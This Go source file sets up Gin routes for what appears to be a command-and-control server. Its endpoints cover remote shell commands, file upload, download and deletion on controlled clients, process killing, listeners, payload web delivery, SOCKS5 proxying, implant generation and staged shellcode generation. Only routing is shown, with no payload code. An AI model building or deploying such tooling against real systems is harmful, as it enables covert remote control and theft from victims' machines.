package routers

import (
	"BackendTemplate/pkg/api"
	"BackendTemplate/pkg/middlewares"
	"embed"
	"html/template"
	"io/fs"
	"net/http"

	"github.com/gin-gonic/gin"
)

func NewRouter(embedFS embed.FS, staticFs fs.FS) *gin.Engine {
	gin.SetMode(gin.ReleaseMode)
	r := gin.New()
	//r := gin.Default()

	// 配置 CORS
	r.Use(middlewares.Cors())

	// 为前端页面和静态资源创建需要Basic认证的路由组
	webGroup := r.Group("/")
	webGroup.Use(middlewares.BasicAuthMiddleware())
	{
		// 提供静态文件，文件夹是 ./static
		webGroup.StaticFS("/static/", http.FS(staticFs))

		// 引入html
		r.SetHTMLTemplate(template.Must(template.New("").ParseFS(embedFS, "dist/*.html")))

		// 处理未匹配的路由（前端页面）
	}
	r.NoRoute(func(c *gin.Context) {
		// 手动执行 BasicAuth
		middlewares.BasicAuthMiddleware()(c)
		if c.IsAborted() {
			return
		}

		c.HTML(http.StatusOK, "index.html", nil)
	})

	// API路由组 - 不需要Basic认证
	a := r.Group("/api")
	{
		// 登录接口 - 不需要任何认证
		a.POST("/users/login", api.LoginHandler)

		// WebSocket连接端点 - 不需要Basic认证，会在处理器中验证JWT token
		a.GET("/ws/interactive/:uid/:sessionId", api.InteractiveShell)
	}

	// 使用 JWT 中间件保护以下路由
	protected := a.Group("/")
	protected.Use(middlewares.AuthMiddleware())

	users := protected.Group("/users")
	{
		// 注销
		users.POST("/logout", api.LogoutHandler)

		// 修改密码
		users.POST("/user_setting/ChangePassword", api.ChangePasswordHandler)
	}

	clients := protected.Group("/client")
	{
		clients.GET("/clientslist", api.GetClients)
		clients.POST("/shell/sendcommand", api.SendCommands)
		clients.GET("/shell/getshellcontent", api.GetShellContent)
		clients.GET("/pid", api.GetPidList)
		clients.POST("/pid/kill", api.KillPid)
		clients.POST("/file/tree", api.FileBrowse)
		clients.POST("/file/delete", api.FileDelete)
		clients.POST("/file/mkdir", api.MakeDir)
		clients.POST("/file/upload", api.FileUpload)
		clients.GET("/note/get", api.GetNote)
		clients.POST("/note/save", api.SaveNote)
		clients.POST("/file/download", api.DownloadFile)
		clients.GET("/downloads/info", api.GetDownloadsInfo)
		clients.POST("/downloads/downloaded_file", api.DownloadDownloadedFile)
		clients.GET("/file/drives", api.ListDrives)
		clients.POST("/file/filecontent", api.FetchFileContent)
		clients.GET("/exit", api.ExitClient)
		clients.POST("/addnote", api.AddUidNote)
		clients.POST("/sleep", api.EditSleep)
		clients.POST("/color", api.EditColor)
		clients.POST("/GenServer", api.GenServer)
		clients.GET("/listener/list", api.ShowListener)
	}

	listeners := protected.Group("/listener")
	{
		listeners.POST("/add", api.AddListener)
		listeners.GET("/list", api.ListListener)
		listeners.POST("/open", api.OpenListener)
		listeners.POST("/close", api.CloseListener)
		listeners.POST("/delete", api.DeleteListener)
	}

	webDelivery := protected.Group("/webdelivery")
	{
		webDelivery.GET("/list", api.ListWebDelivery)
		webDelivery.POST("/start", api.StartWebDelivery)
		webDelivery.POST("/close", api.CloseWebDelivery)
		webDelivery.POST("/open", api.OpenWebDelivery)
		webDelivery.POST("/delete", api.DeleteWebDelivery)
	}

	socks5 := protected.Group("/socks5")
	{
		socks5.GET("/list", api.Socks5List)
		socks5.POST("/start", api.Socks5Start)
		socks5.POST("/open", api.Socks5Open)
		socks5.POST("/close", api.Socks5Close)
		socks5.POST("/delete", api.Socks5Delete)
	}

	settings := protected.Group("/settings")
	{
		settings.GET("/list", api.ListSettings)
		settings.POST("/edit", api.EditSettings)
	}

	protected.POST("/bin/execute", api.ExecuteBin)

	shellcode := protected.Group("/shellcode")
	{
		//shellcode.POST("/stageless", api.StageLessShellCodeGen)
		shellcode.POST("/stage", api.StageShellCodeGen)
	}

	// WebSocket认证token获取端点 - 需要JWT认证
	protected.GET("/ws/auth/:uid", api.GetWebSocketAuthToken)

	return r
}
